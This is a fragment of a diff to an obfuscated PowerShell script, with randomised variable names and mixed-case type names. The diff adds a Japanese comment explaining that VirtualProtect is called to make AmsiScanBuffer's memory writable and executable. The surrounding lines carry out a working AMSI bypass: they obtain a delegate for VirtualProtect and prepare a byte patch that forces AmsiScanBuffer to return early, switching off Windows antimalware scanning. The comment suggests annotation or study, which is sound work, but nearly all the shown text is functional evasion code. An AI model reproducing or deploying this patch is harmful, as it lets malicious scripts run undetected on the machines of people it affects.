@@ -203,6 +203,7 @@ $knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTe
     (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
 )
 #jump
+# VirtualProtectをInvokeで実行して、AmsiScanBufferのアクセス保護属性を「0x40(PAGE_EXECUTE_READWRITE)」に変更
 $UQXThoSh2exMyo = $knBIRuLz.Invoke($jdemwXeK2wnWhB, 3, 0x40, [ref]$N7IBEcG01XRRln)
 #jump
 $hpBlHjUMs = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
